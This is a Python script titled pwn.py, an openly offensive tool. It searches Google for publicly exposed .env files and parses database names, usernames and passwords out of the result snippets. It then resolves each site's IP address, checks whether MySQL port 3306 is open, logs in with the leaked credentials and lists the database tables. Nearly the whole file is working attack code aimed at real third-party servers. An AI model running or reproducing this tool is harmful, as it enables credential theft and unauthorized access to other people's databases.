#!/usr/bin/env python3
import os, sys, socket, pymysql
from google import google

'''
Usage:
pip3 install -r requirements.txt

Windows  : py pwn.py
MacOS    : python3 pwn.py
Linux    : python3 pwn.py

Enjoy
'''

print('''

______
| ___ \\
| |_/ /_   _
| ___ \\ | | |
| |_/ / |_| |
\\____/ \\__, |
        __/ |
       |___/
    _____ _         ______           _  ______
   |_   _| |        | ___ \\         | ||___  /
     | | | |__   ___| |_/ /___  __ _| |   / /  ___ _____ __  _______
     | | | '_ \\ / _ \\    // _ \\/ _` | |  / /  / _ \\_  / '_ \\|_  / _ \\
     | | | | | |  __/ |\ \  __/ (_| | |./ /__|  __// /| | | |/ / (_) |
     \\_/ |_| |_|\\___\\_| \\_\\___|\\__,_|_|\\_____/\\___/___|_| |_/___\\___/

                [GitHub]                            [TWITTER]
         https://github.com/leonv024             @TheRealZeznzo
''')

print('Searching for credentials...')
r = google.search('DB_USERNAME filetype:env', 10) # Search first 10 pages
print('Pwning...')

c = 0 # Found creds counter
c2 = 0 # Found hosts with open database port

for i in range(0, len(r)):

    # Found data
    p = {
    'LINK': None,
    'HOST': None,
    'DB': None,
    'DB_USERNAME': None,
    'DB_PASSWORD': None,
    'STATUS': None
    }

    p['LINK'] = r[i].link.split('://')[1].split('/')[0] # Get domain name

    try:
        p['HOST'] = socket.gethostbyname(p['LINK']) # Get IP address of domain
    except Exception:
        p['HOST'] = 'SOCKET ERROR'

    data = r[i].description # Load data

    # Get data
    if 'DB_USERNAME' in data:
        data = data.split(' ')
        for i in range(0, len(data)):
            if 'DB_DATABASE=' in data[i]:
                p['DB'] = data[i].split('=')[1]
            if 'DB_USERNAME' in data[i]:
                p['DB_USERNAME'] = data[i].split('=')[1]
            if 'DB_PASSWORD' in data[i]:
                p['DB_PASSWORD'] = data[i].split('=')[1]
                c +=1

    t = socket.socket(socket.AF_INET)
    t.settimeout(1)

    try:
        t.connect((p['HOST'], 3306)) # Check is database source is open
        t.close()
        p['STATUS'] = 'Open (CAN BE PWNED)'
    except Exception:
        p['STATUS'] = 'Closed (CANNOT BE PWNED)'

    try:
        if p['STATUS'].startswith('Open'):
            # Open database connection
            db = pymysql.connect(p['HOST'], p['DB_USERNAME'], p['DB_PASSWORD'], p['DB'])
            cursor = db.cursor()
            cursor.execute('show tables')
            data = cursor.fetchall() # Fetch data
            db.close() # Disconnect
        else:
            data = None
    except Exception as e:
        data = e

    # Show result
    print(u'''[CREDENTIALS FOUND]
        LINK          \u2192   %s
        HOST          \u2192   %s
        DATABASE      \u2192   %s
        DB_USERNAME   \u2192   %s
        DB_PASSWORD   \u2192   %s
        PORT          \u2192   3306
        STATUS        \u2192   %s
        DATA          \u2192   %s
    ''' % (p['LINK'], p['HOST'], p['DB'], p['DB_USERNAME'], p['DB_PASSWORD'], p['STATUS'], data))

print('\nFound %i database credentials' % int(c)) # Total creds found
